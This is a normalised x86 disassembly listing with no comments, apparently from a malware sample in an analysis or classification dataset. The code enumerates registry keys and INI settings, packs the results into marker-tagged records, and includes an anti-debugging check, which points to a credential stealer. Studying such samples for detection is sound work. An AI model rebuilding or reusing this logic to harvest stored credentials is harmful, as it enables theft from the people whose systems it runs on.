mov ebp esp
add esp 0xffffffd4
push esi
push edi
push [ ebp + 0xc ]
call sub_401eb3
or eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
call sub_401f7a
or eax eax
je r-xdata
pop edi
pop esi
leave
retn 0x8
pop edi
pop esi
leave
retn 0x8
push [ ebp - 0x4 ]
pop [ ebp - 0x24 ]
shr [ ebp - 0x24 ] 0x1
push [ ebp - 0x24 ]
push [ ebp - 0x8 ]
call sub_4029bb
or eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_40184c
mov [ ebp - 0x14 ] eax
push [ ebp - 0x4 ]
push [ ebp - 0x14 ]
push [ ebp - 0x8 ]
call sub_401883
mov esi [ ebp - 0x14 ]
mov [ ebp - 0x14 ] eax
mov esi eax
jmp r-xdata
or esi esi
je r-xdata
jmp r-xdata
push 0xbeef0002
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_40151c
push [ ebp - 0x14 ]
call sub_401835
lea eax [ ebp - 0x10 ]
push eax
call sub_40200e
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov edi rw-data
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
jmp r-xdata
push edi
push esi
call StrStrA
or eax eax
je r-xdata
jmp r-xdata
mov esi eax
push rw-data
push esi
call StrStrIA
or eax eax
jne r-xdata
inc eax
mov esi eax
mov [ ebp - 0x18 ] esi
push rw-data
push esi
call StrStrA
or eax eax
jne r-xdata
jmp r-xdata
mov dl [ eax ]
mov [ eax ] 0x0
push eax
push edx
push [ ebp - 0x18 ]
call lstrlenA
or eax eax
je r-xdata
jmp r-xdata
pop edx
pop eax
mov [ eax ] dl
mov [ ebp - 0x1c ] eax
push [ ebp - 0x18 ]
call sub_40299a
mov [ ebp - 0x20 ] eax
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_402a8a
or eax eax
je r-xdata
push [ ebp - 0x20 ]
call sub_401835
shr [ ebp - 0x1c ] 0x1
push [ rw-data ]
pop [ ebp - 0x28 ]
push [ rw-data ]
pop [ ebp - 0x2c ]
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x20 ]
call sub_4041a1
or eax eax
je r-xdata
push 0xbeef0001
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp + 0x8 ]
call sub_40151c
sub_40e5a0
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
leave
retn 0x14
push [ ebp + 0x10 ]
push eax
call sub_401dc9
push eax
push sub_40e58e
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_403f6b
call sub_401835
sub_40e5d6
push ebp
mov ebp esp
push 0xbeef0000
push rw-data
push [ ebp + 0xc ]
push 0x1a
push [ ebp + 0x8 ]
call sub_40e5a0
push 0xbeef0000
push rw-data
push [ ebp + 0xc ]
push 0x1c
push [ ebp + 0x8 ]
call sub_40e5a0
push 0xbeef0000
push rw-data
push [ ebp + 0xc ]
push 0x23
push [ ebp + 0x8 ]
call sub_40e5a0
leave
retn 0x8
sub_40e622
push ebp
mov ebp esp
push rw-data
push rw-data
push [ ebp + 0x10 ]
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
leave
retn 0xc
mov [ rw-data ] eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e5d6
push [ rw-data ]
call sub_401835
sub_40e660
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x59
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_40e622
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40e696
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x58
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_40e622
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40e6cc
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x5a
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push 0x0
push rw-data
push rw-data
push 0x80000002
call sub_401cee
or eax eax
je r-xdata
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
push 0x0
push rw-data
push rw-data
push 0x80000002
call sub_401cee
or eax eax
je r-xdata
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_40e7be
push ebp
mov ebp esp
add esp 0xfffff7e8
push 0x105
call sub_40184c
mov [ ebp - 0x818 ] eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call RegOpenKeyA
or eax eax
jne r-xdata
push [ ebp - 0x818 ]
call sub_401835
leave
retn 0xc
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401d75
mov [ ebp - 0x810 ] eax
call sub_401835
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x814 ] eax
cmp [ ebp - 0x814 ] 0x0
je r-xdata
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_40e7be
push [ ebp - 0x810 ]
call sub_401835
push [ ebp - 0x814 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
push rw-data
push [ ebp - 0x814 ]
call sub_401d75
push eax
push eax
push 0x104
push [ ebp - 0x818 ]
push rw-data
push rw-data
push rw-data
call GetPrivateProfileStringA
cmp eax 0x3
jbe r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
call sub_401835
push 0xbeef0000
push rw-data
push [ ebp - 0x818 ]
push [ ebp + 0x10 ]
call sub_404116
sub_40e908
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x5b
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
push rw-data
push [ rw-data ]
call sub_40e7be
push [ ebp + 0x8 ]
push rw-data
push 0x80000002
call sub_40e7be
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40e968
push ebp
mov ebp esp
add esp 0xfffff7b8
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0xc
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0xc ]
call sub_401d75
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401dc9
mov [ ebp - 0x810 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x814 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x818 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x81c ] eax
lea eax [ ebp - 0x824 ]
push eax
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x820 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x828 ] eax
lea eax [ ebp - 0x830 ]
push eax
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x82c ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x834 ] eax
lea eax [ ebp - 0x83c ]
push eax
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x838 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x840 ] eax
lea eax [ ebp - 0x848 ]
push eax
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x844 ] eax
cmp [ ebp - 0x814 ] 0x0
je r-xdata
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_40e968
push [ ebp - 0x810 ]
call sub_401835
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x818 ]
call sub_401835
push [ ebp - 0x81c ]
call sub_401835
push [ ebp - 0x820 ]
call sub_401835
push [ ebp - 0x828 ]
call sub_401835
push [ ebp - 0x82c ]
call sub_401835
push [ ebp - 0x834 ]
call sub_401835
push [ ebp - 0x838 ]
call sub_401835
push [ ebp - 0x840 ]
call sub_401835
push [ ebp - 0x844 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x830 ] 0x0
jne r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
push 0xbeef0000
push [ ebp + 0x10 ]
call sub_4014e6
push [ ebp - 0x814 ]
push [ ebp + 0x10 ]
call sub_401548
push [ ebp - 0x818 ]
push [ ebp + 0x10 ]
call sub_401548
push [ ebp - 0x81c ]
push [ ebp + 0x10 ]
call sub_401548
push [ ebp - 0x824 ]
push [ ebp - 0x820 ]
push [ ebp + 0x10 ]
call sub_40151c
push [ ebp - 0x828 ]
push [ ebp + 0x10 ]
call sub_401548
push [ ebp - 0x830 ]
push [ ebp - 0x82c ]
push [ ebp + 0x10 ]
call sub_40151c
push [ ebp - 0x834 ]
push [ ebp + 0x10 ]
call sub_401548
push [ ebp - 0x83c ]
push [ ebp - 0x838 ]
push [ ebp + 0x10 ]
call sub_40151c
push [ ebp - 0x840 ]
push [ ebp + 0x10 ]
call sub_401548
push [ ebp - 0x848 ]
push [ ebp - 0x844 ]
push [ ebp + 0x10 ]
call sub_40151c
cmp [ ebp - 0x848 ] 0x0
je r-xdata
sub_40ec73
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x5c
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
push rw-data
push [ rw-data ]
call sub_40e968
push [ ebp + 0x8 ]
push rw-data
push 0x80000002
call sub_40e968
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40ecbc
push ebp
mov ebp esp
add esp 0xfffffffc
push 0xbeef0000
push rw-data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404116
push 0xbeef0001
push rw-data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404116
push [ ebp + 0xc ]
call sub_401f36
or eax eax
je r-xdata
leave
retn 0x8
mov [ ebp - 0x4 ] eax
push 0xbeef0000
push rw-data
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_404116
push 0xbeef0001
push rw-data
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_404116
push [ ebp - 0x4 ]
call sub_401835
sub_40ed31
push ebp
mov ebp esp
add esp 0xffffffc4
push 0x0
push rw-data
push rw-data
push [ ebp + 0xc ]
call sub_401cee
or eax eax
je r-xdata
push 0x0
push rw-data
push rw-data
push [ ebp + 0xc ]
call sub_401cee
or eax eax
je r-xdata
mov [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_40ecbc
push [ ebp - 0x4 ]
call sub_401835
push 0x0
push rw-data
push rw-data
push [ ebp + 0xc ]
call sub_401cee
or eax eax
je r-xdata
mov [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_40ecbc
push [ ebp - 0x4 ]
call sub_401835
lea eax [ ebp - 0xc ]
push eax
push rw-data
push rw-data
push [ ebp + 0xc ]
call sub_401cee
or eax eax
je r-xdata
mov [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_40ecbc
push [ ebp - 0x4 ]
call sub_401835
leave
retn 0x8
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0xc ] 0x4
jne r-xdata
push [ ebp - 0x8 ]
call sub_401835
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0x2710
jbe r-xdata
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax 0x2710
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push [ ebp - 0x10 ]
push rw-data
lea eax [ ebp - 0x38 ]
push eax
call wsprintfA
add esp 0xc
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
push rw-data
push [ ebp + 0xc ]
call sub_401cee
or eax eax
je r-xdata
dec [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x3c ] 0x3
jbe r-xdata
push [ ebp - 0x4 ]
call sub_401835
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_40ecbc
sub_40ee58
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x5d
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push 0xbeef0001
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push 0xbeef0001
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40ed31
push 0x80000002
push [ ebp + 0x8 ]
call sub_40ed31
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40eef3
push ebp
mov ebp esp
add esp 0xfffffffc
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_402a38
or eax eax
je r-xdata
leave
retn 0x14
mov [ ebp - 0x4 ] eax
push [ ebp + 0x18 ]
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x4 ]
call sub_401835
mov eax 0x1
sub_40ef3d
push ebp
mov ebp esp
add esp 0xfffffff8
push edi
push esi
push ebx
sub ebx ebx
mov edi rw-data
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
push eax
push 0xbeef0000
push [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x8 ]
call sub_40eef3
or ebx eax
call sub_401835
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_401cee
or eax eax
je r-xdata
mov edi rw-data
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
push eax
mov [ ebp - 0x8 ] eax
push 0xbeef0003
push [ ebp + 0x8 ]
call sub_4014e6
push edi
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_40151c
call sub_401835
or ebx 0x1
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_401cee
or eax eax
je r-xdata
mov edi rw-data
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
push eax
mov esi eax
cmp [ ebp - 0x4 ] 0x1
jbe r-xdata
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_401cee
or eax eax
je r-xdata
mov edi rw-data
call sub_401835
cmp [ esi ] 0x1
jne r-xdata
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
push eax
mov [ ebp - 0x8 ] eax
push 0xbeef0004
push [ ebp + 0x8 ]
call sub_4014e6
push edi
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_40151c
call sub_401835
or ebx 0x1
cmp [ esi ] 0x2
jne r-xdata
inc esi
dec [ ebp - 0x4 ]
push 0xbeef0001
push [ ebp - 0x4 ]
push esi
push edi
push [ ebp + 0x8 ]
call sub_40eef3
or ebx eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_401cee
or eax eax
je r-xdata
or ebx ebx
je r-xdata
inc esi
dec [ ebp - 0x4 ]
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_4041a1
or eax eax
je r-xdata
mov eax ebx
pop ebx
pop esi
pop edi
leave
retn 0x10
push 0xbeef0010
push [ ebp + 0x8 ]
call sub_4014e6
push 0xbeef0002
push [ ebp - 0x4 ]
push esi
push edi
push [ ebp + 0x8 ]
call sub_40eef3
or ebx eax
sub_40f0d2
push ebp
mov ebp esp
add esp 0xfffff7f0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0xc
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0x10 ]
call sub_401d75
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401dc9
mov [ ebp - 0x810 ] eax
push 0x0
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ef3d
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
jmp r-xdata
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
sub_40f171
push ebp
mov ebp esp
add esp 0xfffff7f0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0x10
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0x10 ]
call sub_401d75
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401dc9
push [ ebp + 0x14 ]
push eax
call sub_401dc9
mov [ ebp - 0x810 ] eax
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f0d2
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
jmp r-xdata
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
sub_40f21b
push ebp
mov ebp esp
add esp 0xffffff94
push edi
push [ ebp + 0xc ]
call sub_402a27
or eax eax
jne r-xdata
mov [ ebp - 0x6c ] eax
mov edi [ ebp + 0x1c ]
movzx eax [ edi + 0xf ]
push eax
movzx eax [ edi + 0xe ]
push eax
movzx eax [ edi + 0xd ]
push eax
movzx eax [ edi + 0xc ]
push eax
movzx eax [ edi + 0xb ]
push eax
movzx eax [ edi + 0xa ]
push eax
movzx eax [ edi + 0x9 ]
push eax
movzx eax [ edi + 0x8 ]
push eax
movzx eax [ edi + 0x6 ]
push eax
movzx eax [ edi + 0x4 ]
push eax
push [ edi ]
push rw-data
lea eax [ ebp - 0x64 ]
push eax
call wsprintfA
add esp 0x34
cmp [ ebp + 0x20 ] 0x0
je r-xdata
pop edi
leave
retn 0x1c
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
call sub_4014e6
push [ ebp - 0x6c ]
push [ ebp + 0x18 ]
call sub_401548
lea eax [ ebp - 0x64 ]
push eax
push [ ebp + 0x18 ]
call sub_401548
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x18 ]
call sub_40151c
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_402a38
or eax eax
je r-xdata
push [ ebp - 0x6c ]
call sub_401835
pop edi
leave
retn 0x1c
mov [ ebp - 0x68 ] eax
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
call sub_4014e6
push [ ebp - 0x6c ]
push [ ebp + 0x18 ]
call sub_401548
lea eax [ ebp - 0x64 ]
push eax
push [ ebp + 0x18 ]
call sub_401548
push [ ebp - 0x68 ]
push [ ebp + 0x18 ]
call sub_401548
push [ ebp - 0x68 ]
call sub_401835
jmp r-xdata
sub_40f30a
push ebp
mov ebp esp
add esp 0xfffff3e4
push [ ebp + 0x18 ]
lea eax [ ebp - 0x400 ]
push eax
push [ ebp + 0x8 ]
call sub_40a06e
push [ ebp + 0x18 ]
lea eax [ ebp - 0x800 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a0b9
push 0x0
push 0x0
push 0x3ff
lea eax [ ebp - 0xc00 ]
push eax
push 0xffffffff
push [ ebp + 0x10 ]
push 0x0
push 0x0
call WideCharToMultiByte
mov [ ebp - 0xc10 ] 0x10
mov [ ebp - 0xc0c ] 0x2
mov [ ebp - 0xc08 ] 0x0
mov [ ebp - 0xc04 ] 0x0
mov edx [ ebp + 0x18 ]
mov edx [ edx ]
push 0x0
lea eax [ ebp - 0xc10 ]
push eax
lea eax [ ebp - 0xc14 ]
push eax
lea eax [ ebp - 0xc18 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
push [ ebp + 0x18 ]
call [ edx + 0x44 ]
cmp [ ebp - 0xc18 ] 0x0
je r-xdata
leave
retn 0x14
cmp [ ebp - 0xc14 ] 0x0
je r-xdata
push rw-data
lea eax [ ebp - 0x400 ]
push eax
call lstrcmpiA
test eax eax
je r-xdata
mov [ ebp - 0xc1c ] 0xbeef0005
push rw-data
lea eax [ ebp - 0x800 ]
push eax
call lstrcmpiA
test eax eax
je r-xdata
push rw-data
lea eax [ ebp - 0x400 ]
push eax
call lstrcmpiA
test eax eax
jne r-xdata
cmp [ ebp - 0xc1c ] 0xbeef0007
jne r-xdata
mov [ ebp - 0xc1c ] 0xbeef0006
push rw-data
lea eax [ ebp - 0x800 ]
push eax
call lstrcmpiA
test eax eax
je r-xdata
push [ ebp - 0xc14 ]
call CoTaskMemFree
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push [ ebp - 0xc18 ]
push [ ebp - 0xc14 ]
push [ ebp + 0x10 ]
push [ ebp - 0xc1c ]
call sub_40f21b
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push [ ebp - 0xc18 ]
push [ ebp - 0xc14 ]
push [ ebp + 0x10 ]
push [ ebp - 0xc1c ]
call sub_40f21b
jmp r-xdata
mov [ ebp - 0xc1c ] 0xbeef0007
push rw-data
lea eax [ ebp - 0x800 ]
push eax
call lstrcmpiA
test eax eax
jne r-xdata
sub_40f4b3
push ebp
mov ebp esp
add esp 0xfffffffc
cmp [ rw-data ] 0x0
je r-xdata
leave
retn 0x4
mov [ ebp - 0x4 ] 0x0
sub eax eax
push eax
push eax
push eax
lea edx [ ebp - 0x4 ]
push edx
call [ rw-data ]
test eax eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push sub_40f30a
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_40a223
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
push [ ebp - 0x4 ]
call [ edx + 0x8 ]
jmp r-xdata
sub_40f505
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x5e
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
call sub_40f4b3
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40f0d2
push rw-data
push rw-data
call sub_401d75
push eax
push eax
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40f171
call sub_401835
push 0x0
push rw-data
push rw-data
push 0x80000002
call sub_401cee
or eax eax
je r-xdata
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40f0d2
push 0x0
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40f171
push 0x0
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40f171
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
push rw-data
push eax
call sub_401dc9
push eax
push eax
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40f0d2
call sub_401835
sub_40f5e4
push ebp
mov ebp esp
add esp 0xfffffef4
push 0x0
push 0x5f
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov [ rw-data ] 0x2
lea eax [ ebp - 0x109 ]
push eax
push 0x104
call GetCurrentDirectoryA
push rw-data
push rw-data
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_409a01
push rw-data
push rw-data
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_409a01
lea eax [ ebp - 0x109 ]
push eax
call SetCurrentDirectoryA
mov [ rw-data ] 0x3
lea eax [ ebp - 0x109 ]
push eax
push 0x104
call GetCurrentDirectoryA
push rw-data
push rw-data
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_409a01
push rw-data
push rw-data
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_409a01
lea eax [ ebp - 0x109 ]
push eax
call SetCurrentDirectoryA
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40f6cb
push ebp
mov ebp esp
add esp 0xfffffffc
push esi
push edi
push 0x0
push 0x60
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
pop esi
leave
retn 0x4
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
jmp r-xdata
push esi
call sub_4023a8
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
cmp [ esi ] 0x0
jne r-xdata
inc esi
inc esi
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
sub_40f749
push ebp
mov ebp esp
add esp 0xfffffffc
push edi
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
inc edi
inc ebp
cld
add [ eax ] al
add [ eax ] al
mov edi rw-data
push [ ebp + 0x8 ]
pop [ rw-data ]
mov eax [ fs : 0x30 ]
cmp [ eax + 0x2 ] 0x0
je r-xdata
retn
jmp r-xdata
push [ ebp + 0x8 ]
call sub_401021
cmp [ edi ] 0x0
jne r-xdata
call sub_402387
push [ ebp + 0x8 ]
call sub_40149f
mov [ rw-data ] eax
push [ fs : 0x0 ]
mov eax esp
push [ fs : 0x0 ]
push ebp
push eax
push r-xdata
push sub_40f7f3
push eax
mov [ fs : 0x0 ] esp
push [ ebp + 0x8 ]
call [ edi ]
cmp [ edi ] sub_4043c2
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0x4
add esp 0x18
jmp r-xdata
cmp eax 0x10
je r-xdata
pop [ fs : 0x0 ]
add edi 0x4
push [ rw-data ]
push [ rw-data ]
call sub_4012dc
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
sub_40f7f3
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
push [ edx + 0x8 ]
pop [ eax + 0xb8 ]
push [ edx + 0xc ]
pop [ eax + 0xc4 ]
push [ edx + 0x10 ]
pop [ eax + 0xb4 ]
